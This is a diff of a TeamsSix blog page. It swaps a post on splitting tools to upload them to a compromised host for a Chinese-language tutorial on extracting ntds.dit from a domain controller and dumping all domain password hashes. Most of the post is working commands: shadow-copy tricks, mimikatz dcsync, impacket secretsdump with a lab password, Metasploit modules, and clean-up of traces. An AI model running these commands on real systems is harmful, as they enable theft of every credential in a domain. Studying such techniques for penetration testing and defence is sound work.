@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【内网学习笔记】两种突破内网中无法上传大文件的方法, TeamsSix">
+    <meta name="keywords" content="【内网学习笔记】26、ntds.dit 的提取与散列值导出, TeamsSix">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -29,7 +29,7 @@
 </script>
 
 
-    <title>【内网学习笔记】两种突破内网中无法上传大文件的方法 | TeamsSix</title>
+    <title>【内网学习笔记】26、ntds.dit 的提取与散列值导出 | TeamsSix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -271,12 +271,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210629220302.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908155944.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【内网学习笔记】两种突破内网中无法上传大文件的方法</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】26、ntds.dit 的提取与散列值导出</h1>
                 </div>
             </div>
         </div>
@@ -425,28 +425,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-30
+                    2021-09-09
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-09-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    2.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    11 分
                 </div>
                 
 
@@ -469,131 +469,241 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。</p>
-<p>在前段时间就碰到了这个问题，当时在拿下目标 shell 后发现只能上传几百 K 的小文件，文件稍微大些比如几 M 的文件就会提示上传失败，在此简单记录下当时解决的办法。</p>
-<p>针对这种情况，就需要将大文件变成小文件后再进行上传，个人觉着可以简单的分为两种方式，一种是常规的压缩文件一种是分割文件，先来看看第一种方法。</p>
-<h1 id="0x01-压缩文件"><a href="#0x01-压缩文件" class="headerlink" title="0x01 压缩文件"></a>0x01 压缩文件</h1><p>这里以 7-Zip 为代表，其他的压缩软件还有 WinRAR 等，7-Zip 文件下载地址：<a target="_blank" rel="noopener" href="https://www.7-zip.org/">https://www.7-zip.org/</a></p>
-<p>如果目标主机没有安装 7-Zip，可以现在自己的主机上安装 7-Zip，然后把安装目录下的 7z.exe 拷贝到目标主机上，默认路径为「C:\Program Files\7-Zip\7z.exe」。</p>
-<p>7z.exe 只有 400 多 K 的大小，可以说很是小巧了，以下为 7z.exe 的常用命令。</p>
-<pre class="line-numbers language-none"><code class="language-none">a     添加压缩文件
-x     解压压缩文件
--p    指定密码
--v    分卷压缩
--r    递归压缩
--o    指定输出目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %SystemRoot%\ntds.dit</p>
+<p>ntds.dit 中包含（但不限于）用户名、散列值、组、GPP、OU 等与活动目录相关的信息，因此如果我们拿到 ntds.dit 就能获取到域内所有用户的 hash</p>
+<p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。</p>
+<p>不过使用 Windows 本地卷影拷贝服务，就可以获得文件的副本（类似于虚拟机的快照）</p>
+<h2 id="1、使用卷影拷贝服务提取-ntds-dit"><a href="#1、使用卷影拷贝服务提取-ntds-dit" class="headerlink" title="1、使用卷影拷贝服务提取 ntds.dit"></a>1、使用卷影拷贝服务提取 ntds.dit</h2><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h3><p>ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p>
+<p>该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。</p>
+<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="普通的压缩-解压文件"><a href="#普通的压缩-解压文件" class="headerlink" title="普通的压缩/解压文件"></a>普通的压缩/解压文件</h3><p>把 fscan.exe 压缩成 fscan.7z，压缩密码为『teamssix.com』</p>
-<pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>加载刚刚创建的快照</p>
+<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;mount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com fscan.7z fscan.exe
+<p>使用 copy 命令将快照中的文件复制到 C 盘下</p>
+<pre class="line-numbers language-none"><code class="language-none">copy C:\$SNAP_202109081356_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06
-Scanning the drive:
-1 file, 2911744 bytes (2844 KiB)
-Creating archive: fscan.7z
-Add new data to archive: 1 file, 2911744 bytes (2844 KiB)
-Files read from disk: 1
-Archive size: 2794266 bytes (2729 KiB)
-Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>删除之前加载的快照</p>
+<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;unmount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; &quot;delete &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>把 fscan.7z 解压成 fscan.exe</p>
-<pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查询当前系统中的快照，可以看到没有任何快照</p>
+<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908135855.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h3><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p>
+<p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p>
+<pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06
-Scanning the drive for archives:
-1 file, 2794266 bytes (2729 KiB)
-Extracting archive: fscan.7z
---
-Path &#x3D; fscan.7z
-Type &#x3D; 7z
-Physical Size &#x3D; 2794266
-Headers Size &#x3D; 170
-Method &#x3D; LZMA2:3m BCJ 7zAES
-Solid &#x3D; -
-Blocks &#x3D; 1
-Everything is Ok
-Size:       2911744
-Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在创建的卷影拷贝中将 ntds.dit 复制出来</p>
+<pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>fscan.7z 的大小是 2729 KB，fscan.exe 的大小是 2844 KB，可以看到其实大小差别也不大，没能达到我们将大文件变成小文件的目的，这种大小上传可能还是会失败，那再来试试分卷上传。</p>
-<h3 id="分卷压缩-解压文件"><a href="#分卷压缩-解压文件" class="headerlink" title="分卷压缩/解压文件"></a>分卷压缩/解压文件</h3><p>分卷压缩其实和下面介绍的分割文件有点类似，区别还是在于一个对文件进行了压缩，一个没有进行压缩。</p>
-<p>把 fscan.exe 以 500 K 大小进行分卷压缩。</p>
-<pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>删除快照</p>
+<pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908145721.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h3 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h3><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p>
+<p>vssown.vbs 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p>
+<p>启动卷影拷贝服务</p>
+<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06
-Scanning the drive:
-1 file, 2911744 bytes (2844 KiB)
-Creating archive: fscan.7z
-Add new data to archive: 1 file, 2911744 bytes (2844 KiB)
-Files read from disk: 1
-Archive size: 2794266 bytes (2729 KiB)
-Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>创建一个 C 盘的卷影拷贝</p>
+<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;dir
- 驱动器 C 中的卷没有标签。
- 卷的序列号是 2C2C-615D
- C:\7-Zip 的目录
-2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          .
-2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          ..
-2021&#x2F;05&#x2F;06  15:00           489,472 7z.exe
-2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.001
-2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.002
-2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.003
-2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.004
-2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.005
-2021&#x2F;06&#x2F;29  21:40           234,266 fscan.7z.006
-2021&#x2F;06&#x2F;18  14:58         2,911,744 fscan.exe
-               8 个文件      6,195,482 字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>列出当前卷影拷贝</p>
+<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>把 fscan.7z 解压成 fscan.exe</p>
-<pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z.001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>复制 ntds.dit</p>
+<pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z.001
+<p>删除卷影拷贝</p>
+<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06
-Scanning the drive for archives:
-1 file, 512000 bytes (500 KiB)
-Extracting archive: fscan.7z.001
---
-Path &#x3D; fscan.7z.001
-Type &#x3D; SplitPhysical 
-Size &#x3D; 512000
-Volumes &#x3D; 6Total 
-Physical Size &#x3D; 2794266
-----
-Path &#x3D; fscan.7z
-Size &#x3D; 2794266
---
-Path &#x3D; fscan.7z
-Type &#x3D; 7z
-Physical Size &#x3D; 2794266
-Headers Size &#x3D; 170
-Method &#x3D; LZMA2:3m BCJ 7zAES
-Solid &#x3D; -
-Blocks &#x3D; 1
-Everything is Ok
-Size:       2911744
-Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908152359.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p>
+<p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p>
+<p>在域控中以管理员模式打开命令行环境，输入命令</p>
+<pre class="line-numbers language-none"><code class="language-none">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>可以看到，使用分卷压缩可以把一个大文件分成多个小文件，然后将小文件上传上去后，再进行解压就可以了。</p>
-<p>但这样做感觉还是有些麻烦，直接使用下文的 split 进行文件分割个人觉着是更为方便的方法，使用 split 进行分割也是我个人解决前段时间碰到不能上传大文件问题时的方法。</p>
-<h1 id="0x02-分割文件"><a href="#0x02-分割文件" class="headerlink" title="0x02 分割文件"></a>0x02 分割文件</h1><p>使用 split 以 500 K 大小分割 fscan.exe 文件，split 命令在 Linux 和 MAC 下都是自带的，因此在自己的电脑上分割好后，直接上传即可。</p>
-<pre class="line-numbers language-none"><code class="language-none">split -b 500k fscan.exe teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p>
+<p>将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除</p>
+<pre class="line-numbers language-none"><code class="language-none">rmdir &#x2F;s&#x2F;q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>合并分割文件为 fscan.exe</p>
-<pre class="line-numbers language-none"><code class="language-none">cat teamssix* &gt; fscan			# 适用于 Linux、Mac
-copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Copy-VSS.ps1
+Copy-vss
+或者
+PowerShell -Exec bypass -C &quot;Import-module .\Copy-VSS.ps1;Copy-vss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210629220302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p>个人觉着直接用 split 分割文件是较为方便的做法，无需第三方软件，且不论目标是 Linux 还是 Windows 都能支持。</p>
+<p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。</p>
+<h3 id="diskshadow"><a href="#diskshadow" class="headerlink" title="diskshadow"></a>diskshadow</h3><p>diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。</p>
 <blockquote>
+<p>diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作</p>
+</blockquote>
+<p>首先创建一个 txt 文件，内容如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">set context persistent nowriters
+add volume c: alias someAlias
+create
+expose %someAlias% k:
+exec &quot;C:\windows\system32\cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\ntds.dit
+delete shadows all
+list shadows all
+reset
+exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用 diskshadow 调用刚才的文本文件</p>
+<pre class="line-numbers language-none"><code class="language-none">diskshadow &#x2F;s C:\command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p>
+<pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908155944.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h3 id="Invoke-NinjaCopy-ps1"><a href="#Invoke-NinjaCopy-ps1" class="headerlink" title="Invoke-NinjaCopy.ps1"></a>Invoke-NinjaCopy.ps1</h3><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p>
+<p>PowerSploit 工具包项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1
+Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>impacket 安装</p>
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.git
+cd impacket
+python3 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>通过 impacket  里的 secretsdump.py 脚本可以直接远程读取 ntds.dit 并导出哈希值</p>
+<pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9
+python3 secretsdump.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="2、导出-ntds-dit-文件中的散列值"><a href="#2、导出-ntds-dit-文件中的散列值" class="headerlink" title="2、导出 ntds.dit 文件中的散列值"></a>2、导出 ntds.dit 文件中的散列值</h2><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>安装 esedbexport，以 Kali 为例</p>
+<pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-config
+wget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20210424&#x2F;libesedb-experimental-20210424.tar.gz
+tar zxvf libesedb-experimental-20210424.tar.gz
+cd libesedb-20210424
+.&#x2F;configure
+make
+make install
+ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>导出 ntds.dit</p>
+<pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>安装 ntdsxtract</p>
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.git
+cd ntdsxtract
+python setup.py build
+python setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p>
+<pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export&#x2F;datatable.3 ntds.dit.export&#x2F;link_table.5 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p>
+</blockquote>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908171420.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p>
+<pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将 ntds.dit.export 和 SYSTEM 文件放入到 impacket 工具的文件夹中</p>
+<pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>或者直接使用 python 执行 secretsdump.py 文件</p>
+<pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9
+python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p>
+<pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件，不过需要管理员权限。</p>
+<p>导出域内所有用户的用户名和哈希值</p>
+<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>导出域内指定用户的用户名和哈希值</p>
+<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以通过转储 lsass.exe 进行 dump 操作</p>
+<pre class="line-numbers language-none"><code class="language-none">privilege::debug
+lsadump::lsa &#x2F;inject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了</p>
+</blockquote>
+<h3 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h3><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p>
+<p>Invoke-DCSync.ps1 下载地址：<a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .&#x2F;Invoke-DCSync.ps1
+Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下 </p>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrab
+set rhosts 192.168.7.7
+set smbdomain teamssix.com
+set smbuser administrator
+set smbpass 1qaz@WSX
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p>
+<pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump
+set session 1
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p>
+</blockquote>
+<h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p>
+<p>DSInternals 下载地址：<a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p>
+<p>安装 DSInternals</p>
+<pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>直接导出 hash，并保存在 output_hash.txt 文件里</p>
